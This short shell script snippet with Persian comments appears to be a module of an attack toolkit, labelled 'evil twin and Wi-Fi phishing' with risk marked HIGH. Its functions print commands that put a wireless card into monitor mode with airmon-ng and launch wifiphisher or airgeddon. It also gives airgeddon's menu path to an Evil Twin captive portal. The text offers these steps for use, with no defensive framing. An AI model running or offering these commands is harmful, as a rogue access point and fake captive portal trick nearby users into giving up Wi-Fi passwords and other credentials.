DESC="ایول‌توین و فیشینگ وای‌فای"
REQ="wifiphisher یا airgeddon"
RISK="HIGH"

termux(){
cat <<'EOF'
# ترموکس محدود است؛ بهتر است از گوشی دوم با کالی چroot استفاده کنی
su -c "airmon-ng start wlan0"
EOF
}

kali(){
cat <<'EOF'
sudo wifiphisher -i wlan0mon
# یا:
sudo airgeddon
# منو: 7 (Evil Twin) > 8 (Captive Portal)
EOF
}
